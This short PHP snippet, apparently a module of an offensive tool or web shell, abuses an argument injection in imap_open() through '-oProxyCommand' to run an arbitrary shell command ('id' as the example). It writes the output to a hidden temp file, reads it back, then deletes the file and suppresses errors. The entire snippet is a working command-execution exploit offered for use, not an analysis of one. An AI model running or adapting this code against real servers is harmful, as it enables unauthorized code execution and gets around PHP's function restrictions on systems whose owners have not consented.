ob_start();

if (!function_exists('imap_open')) {
    ob_end_clean();
    return "J_ERROR: imap_open() not available";
}

//
$cmd = 'id';

//
$output_path = sys_get_temp_dir() . '/.imap_out';
$cmd_full = "$cmd > " . escapeshellarg($output_path) . " 2>&1";
$payload = 'x -oProxyCommand=' . escapeshellarg($cmd_full);

//
@imap_open("{{$payload}}", "", "");
sleep(1);

//
$output = file_exists($output_path) ? file_get_contents($output_path) : "Command executed (no output)";
@unlink($output_path);

ob_end_clean();
return $output;
